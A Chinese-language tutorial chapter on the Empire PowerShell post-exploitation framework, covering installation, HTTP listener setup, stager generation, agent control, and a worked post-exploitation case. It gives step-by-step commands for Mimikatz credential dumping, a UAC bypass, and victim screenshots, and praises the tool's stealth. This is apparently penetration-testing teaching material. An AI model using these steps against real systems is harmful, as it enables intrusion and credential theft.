# 第十九章：Empire - PowerShell后渗透框架

## 19.1 Empire 简介

### 什么是 Empire？

Empire是一个PowerShell和Python后渗透框架，用于Windows系统的渗透测试。

**Empire**的特点：
- PowerShell原生
- 无需落地文件
- 模块丰富
- 隐蔽性强
- 易于扩展

简单来说，Empire是**Windows后渗透的神器**。

### Empire vs Metasploit

| 特点 | Empire | Metasploit |
|------|--------|------------|
| 语言 | PowerShell | Ruby |
| 平台 | Windows | 跨平台 |
| 文件 | 无需落地 | 需落地 |
| 隐蔽 | 更隐蔽 | 一般 |

---

## 19.2 安装教程

### Linux 安装

**安装依赖：**
```bash
sudo apt install python3-pip
```

**克隆项目：**
```bash
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire
```

**安装依赖：**
```bash
pip3 install -r requirements.txt
```

**启动Empire：**
```bash
python3 empire
```

---

## 19.3 界面介绍

### 主界面

```
(Empire) >
```

### 常用命令

| 命令 | 说明 |
|------|------|
| listeners | 管理监听器 |
| agents | 管理代理 |
| usemodule | 使用模块 |
| usestager | 使用载荷 |
| help | 帮助信息 |

---

## 19.4 监听器配置详解

### 创建监听器

```
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Name http_listener
(Empire: listeners/http) > set Host http://192.168.1.100:80
(Empire: listeners/http) > execute
```

### 监听器类型

| 类型 | 说明 |
|------|------|
| http | HTTP监听 |
| https | HTTPS监听 |
| dbx | Dropbox |
| onedrive | OneDrive |

---

## 19.5 Stager生成详解

### 什么是Stager？

Stager是初始载荷，用于建立连接。

### 生成Stager

```
(Empire) > usestager windows/launcher_bat http_listener
(Empire: stager/windows/launcher_bat) > set Listener http_listener
(Empire: stager/windows/launcher_bat) > execute
```

### Stager类型

| 类型 | 说明 |
|------|------|
| launcher_bat | BAT脚本 |
| launcher_vbs | VBS脚本 |
| launcher_powershell | PowerShell脚本 |
| dll | DLL文件 |
| hta | HTA文件 |

---

## 19.6 Agent管理详解

### 什么是Agent？

Agent是已连接的目标，可以执行后渗透操作。

### 查看Agent

```
(Empire) > agents
```

### 交互Agent

```
(Empire) > interact <agent_name>
```

### Agent命令

| 命令 | 说明 |
|------|------|
| shell | 执行命令 |
| download | 下载文件 |
| upload | 上传文件 |
| ps | 列出进程 |
| jobs | 列出任务 |
| sc | 截屏 |

---

## 19.7 模块使用详解

### 模块分类

| 分类 | 说明 |
|------|------|
| collection | 信息收集 |
| credentials | 凭证获取 |
| exploitation | 漏洞利用 |
| lateral_movement | 横向移动 |
| persistence | 持久化 |
| privesc | 权限提升 |
| situational_awareness | 环境感知 |

### 使用模块

```
(Empire: agent) > usemodule situational_awareness/host/computerinfo
(Empire: module) > execute
```

---

## 19.8 凭证获取详解

### Mimikatz模块

```
(Empire: agent) > usemodule credentials/mimikatz/logonpasswords
(Empire: module) > execute
```

### 获取密码

输出包含明文密码和哈希。

---

## 19.9 权限提升详解

### BypassUAC模块

```
(Empire: agent) > usemodule privesc/bypassuac_eventvwr
(Empire: module) > set Listener http_listener
(Empire: module) > execute
```

提升到管理员权限。

---

## 19.10 实战案例：后渗透

### 场景说明

已连接目标，执行后渗透操作。

### 步骤

**步骤1：交互Agent**
```
(Empire) > interact agent1
```

**步骤2：信息收集**
```
(Empire: agent) > shell whoami
(Empire: agent) > shell net user
```

**步骤3：获取凭证**
```
(Empire: agent) > usemodule credentials/mimikatz/logonpasswords
(Empire: module) > execute
```

**步骤4：截屏**
```
(Empire: agent) > usemodule collection/screenshot
(Empire: module) > execute
```

---

## 总结

本章介绍了Empire的使用：

1. **安装配置**：Linux安装
2. **监听器**：创建和管理监听器
3. **Stager**：生成初始载荷
4. **Agent**：管理目标会话
5. **模块**：各种后渗透模块
6. **凭证获取**：Mimikatz模块
7. **权限提升**：BypassUAC

Empire是Windows后渗透的专业框架。

下一章我们将学习PowerSploit——PowerShell安全工具集！